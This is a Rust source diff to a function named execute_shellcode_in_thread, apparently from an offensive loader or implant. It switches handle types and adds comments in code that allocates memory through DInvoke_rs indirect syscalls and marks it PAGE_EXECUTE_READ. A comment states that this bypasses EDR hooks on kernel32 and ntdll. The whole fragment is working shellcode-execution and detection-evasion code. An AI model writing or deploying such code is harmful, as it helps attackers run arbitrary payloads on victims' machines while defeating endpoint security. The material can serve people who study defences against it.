@@ -144,11 +144,18 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
     {
         // Indirect syscalls via DInvoke_rs by @Kudaes (https://github.com/Kudaes/DInvoke_rs)
         // Bypasses EDR hooks on kernel32/ntdll by resolving syscall numbers at runtime
-        let mut base_address: *mut winapi::ctypes::c_void = ptr::null_mut();
+        //
+        // DInvoke_rs::dinvoke module provides:
+        //   nt_allocate_virtual_memory(handle, base_addr, zero_bits, size, alloc_type, protect)
+        //   nt_protect_virtual_memory(handle, base_addr, size, new_protect, old_protect)
+        // where handle is isize (HANDLE as raw value, -1 = current process)
+
+        let handle: isize = -1; // NtCurrentProcess
+        let mut base_address: *mut std::ffi::c_void = ptr::null_mut();
         let mut region_size: usize = buffer_size;
 
         let status = dinvoke_rs::dinvoke::nt_allocate_virtual_memory(
-            -1isize as *mut _,
+            handle,
             &mut base_address,
             0,
             &mut region_size,
@@ -165,7 +172,7 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
 
         let mut old_protect: u32 = 0;
         let status = dinvoke_rs::dinvoke::nt_protect_virtual_memory(
-            -1isize as *mut _,
+            handle,
             &mut base_address,
             &mut region_size,
             PAGE_EXECUTE_READ,
